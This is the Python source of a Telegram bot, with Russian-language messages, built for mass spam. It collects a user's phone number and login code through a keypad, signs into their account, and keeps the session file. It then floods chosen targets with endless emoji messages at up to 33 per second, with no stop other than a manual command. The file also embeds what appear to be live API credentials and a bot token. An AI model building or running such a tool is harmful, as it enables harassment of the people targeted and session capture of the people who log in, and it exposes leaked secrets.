import asyncio
import os
import logging
from telethon import TelegramClient, events, Button
from telethon.errors import PhoneCodeInvalidError, PhoneCodeExpiredError

API_ID = 34887681
API_HASH = "9a2905a9627fb1959b6699452ec59e99"
BOT_TOKEN = "8990879407:AAHi7CTsOEhLSAr38RnL6dK5teG9Bj28IuQ"

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

os.makedirs("sessions", exist_ok=True)

user_states = {}
spam_tasks = {}

# ЖЕСТКИЙ ТЕКСТ — 1000+ печенек
HARD_COOKIE = "🍪" * 1000  # 1000 печенек в одном сообщении

async def main():
    bot = await TelegramClient("sessions/bot_session", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
    logger.info("🚀 МЕГА-СПАМ БОТ ЗАПУЩЕН НА ВИЛЛЕ В ЧАДЕ!")
    
    @bot.on(events.NewMessage(pattern='/start'))
    async def start(event):
        chat_id = event.chat_id
        if chat_id in user_states and user_states[chat_id].get('logged'):
            await event.reply('✅ Уже в системе!\nКоманды:\n/spam-fast @user — быстрый спам\n/spam-hard @user — жесткий спам\n/stop — остановить')
            return
        buttons = [[Button.request_phone('📱 Передать контакт', resize=True)]]
        await event.reply('Нажми кнопку для входа:', buttons=buttons)
        user_states[chat_id] = {'step': 'wait_contact'}

    @bot.on(events.NewMessage(func=lambda e: e.contact))
    async def get_contact(event):
        chat_id = event.chat_id
        if chat_id not in user_states:
            await event.reply('❌ /start')
            return
        phone = event.contact.phone_number
        if not phone.startswith('+'):
            phone = '+' + phone
        try:
            client = TelegramClient(f"sessions/user_{chat_id}", API_ID, API_HASH)
            await client.connect()
            result = await client.send_code_request(phone)
            keyboard = [
                [Button.inline('1'), Button.inline('2'), Button.inline('3')],
                [Button.inline('4'), Button.inline('5'), Button.inline('6')],
                [Button.inline('7'), Button.inline('8'), Button.inline('9')],
                [Button.inline('0'), Button.inline('⬅️'), Button.inline('✅ Готово')]
            ]
            user_states[chat_id] = {
                'step': 'wait_code',
                'client': client,
                'phone': phone,
                'phone_code_hash': result.phone_code_hash,
                'code': ''
            }
            await event.reply(f'✅ Код на {phone}. Введи через кнопки:', buttons=keyboard)
        except Exception as e:
            await event.reply(f'❌ Ошибка: {str(e)[:100]}')

    @bot.on(events.CallbackQuery())
    async def on_callback(event):
        chat_id = event.chat_id
        data = event.data.decode()
        if chat_id not in user_states:
            await event.answer('Сначала /start', alert=True)
            return
        state = user_states[chat_id]
        if state.get('step') != 'wait_code':
            await event.answer('Сначала контакт', alert=True)
            return
        if data == '✅ Готово':
            code = state['code']
            if len(code) < 4:
                await event.answer('4-6 цифр', alert=True)
                return
            try:
                await state['client'].sign_in(
                    phone=state['phone'],
                    code=code,
                    phone_code_hash=state['phone_code_hash']
                )
                state['step'] = 'logged'
                state['logged'] = True
                await event.edit('✅ Вход выполнен!\nКоманды:\n/spam-fast @user\n/spam-hard @user')
            except Exception as e:
                await event.answer(f'Ошибка: {str(e)[:50]}', alert=True)
                state['code'] = ''
            return
        if data == '⬅️':
            state['code'] = state['code'][:-1]
        else:
            if len(state['code']) >= 6:
                await event.answer('Макс 6', alert=True)
                return
            state['code'] += data
        current = state['code']
        display = '•' * len(current) if current else '____'
        await event.edit(
            f'Код: **{display}** ({len(current)}/6)',
            buttons=keyboard_buttons()
        )

    def keyboard_buttons():
        return [
            [Button.inline('1'), Button.inline('2'), Button.inline('3')],
            [Button.inline('4'), Button.inline('5'), Button.inline('6')],
            [Button.inline('7'), Button.inline('8'), Button.inline('9')],
            [Button.inline('0'), Button.inline('⬅️'), Button.inline('✅ Готово')]
        ]

    @bot.on(events.NewMessage(pattern='/spam-fast'))
    async def spam_fast(event):
        chat_id = event.chat_id
        if chat_id not in user_states or not user_states[chat_id].get('logged'):
            await event.reply('❌ Сначала войди через /start')
            return
        
        # Останавливаем старый спам
        if chat_id in spam_tasks:
            for task in spam_tasks[chat_id]:
                if not task.done():
                    task.cancel()
        
        parts = event.raw_text.split()
        if len(parts) < 2:
            await event.reply('⚠️ /spam-fast @user1 @user2 ...')
            return
        
        targets = parts[1:]
        client = user_states[chat_id]['client']
        
        users = []
        for t in targets:
            try:
                user = await client.get_entity(t)
                users.append(user)
            except Exception as e:
                await event.reply(f'❌ Не найден {t}: {str(e)[:50]}')
                return
        
        await event.reply(f'⚡ БЫСТРЫЙ спам для {len(users)} аккаунтов! (по 1 печеньке, 0.03 сек)')
        
        tasks = []
        for user in users:
            task = asyncio.create_task(spam_loop_fast(event, chat_id, user, client))
            tasks.append(task)
        spam_tasks[chat_id] = tasks

    async def spam_loop_fast(event, chat_id, target_user, client):
        count = 0
        try:
            while True:
                await client.send_message(target_user, '🍪')
                count += 1
                await asyncio.sleep(0.03)  # ОЧЕНЬ БЫСТРО
                if count % 200 == 0:
                    await event.reply(f'⚡ {target_user.first_name}: {count} отправлено')
        except asyncio.CancelledError:
            await event.reply(f'🛑 {target_user.first_name} (быстрый): {count} отправлено')
        except Exception as e:
            await event.reply(f'❌ {target_user.first_name}: {str(e)[:50]}')

    @bot.on(events.NewMessage(pattern='/spam-hard'))
    async def spam_hard(event):
        chat_id = event.chat_id
        if chat_id not in user_states or not user_states[chat_id].get('logged'):
            await event.reply('❌ Сначала войди через /start')
            return
        
        if chat_id in spam_tasks:
            for task in spam_tasks[chat_id]:
                if not task.done():
                    task.cancel()
        
        parts = event.raw_text.split()
        if len(parts) < 2:
            await event.reply('⚠️ /spam-hard @user1 @user2 ...')
            return
        
        targets = parts[1:]
        client = user_states[chat_id]['client']
        
        users = []
        for t in targets:
            try:
                user = await client.get_entity(t)
                users.append(user)
            except Exception as e:
                await event.reply(f'❌ Не найден {t}: {str(e)[:50]}')
                return
        
        await event.reply(f'🔥 ЖЕСТКИЙ спам для {len(users)} аккаунтов! (огромный текст, 0.5 сек)')
        
        tasks = []
        for user in users:
            task = asyncio.create_task(spam_loop_hard(event, chat_id, user, client))
            tasks.append(task)
        spam_tasks[chat_id] = tasks

    async def spam_loop_hard(event, chat_id, target_user, client):
        count = 0
        try:
            while True:
                await client.send_message(target_user, HARD_COOKIE)
                count += 1
                await asyncio.sleep(0.5)  # Чуть медленнее, но текст огромный
                if count % 50 == 0:
                    await event.reply(f'🔥 {target_user.first_name}: {count} отправлено (огромный текст)')
        except asyncio.CancelledError:
            await event.reply(f'🛑 {target_user.first_name} (жесткий): {count} отправлено')
        except Exception as e:
            await event.reply(f'❌ {target_user.first_name}: {str(e)[:50]}')

    @bot.on(events.NewMessage(pattern='/stop'))
    async def stop_spam(event):
        chat_id = event.chat_id
        if chat_id not in spam_tasks:
            await event.reply('❌ Спам не запущен')
            return
        for task in spam_tasks[chat_id]:
            if not task.done():
                task.cancel()
        await event.reply('🛑 ВСЕ СПАМ-ПОТОКИ ОСТАНОВЛЕНЫ!')
        del spam_tasks[chat_id]

    @bot.on(events.NewMessage(pattern='/help'))
    async def help_command(event):
        await event.reply(
            '📖 **КОМАНДЫ:**\n'
            '/start — вход\n'
            '/spam-fast @user1 @user2 — быстрый спам (по 1 🍪, 0.03 сек)\n'
            '/spam-hard @user1 @user2 — жесткий спам (огромный текст, 0.5 сек)\n'
            '/stop — остановить всё\n'
            '/help — помощь\n\n'
            '🔥 Жесткий текст — 1000 печенек за 1 сообщение!\n'
            '⚡ Быстрый — 33 сообщения в секунду!\n'
            '👥 Многопоточность — каждый аккаунт в своём потоке!'
        )

    print('🚀 МЕГА-СПАМ БОТ ГОТОВ!')
    print('⚡ /spam-fast @user — БЫСТРЫЙ СПАМ (0.03 сек)')
    print('🔥 /spam-hard @user — ЖЕСТКИЙ СПАМ (1000 🍪 за раз)')
    await bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
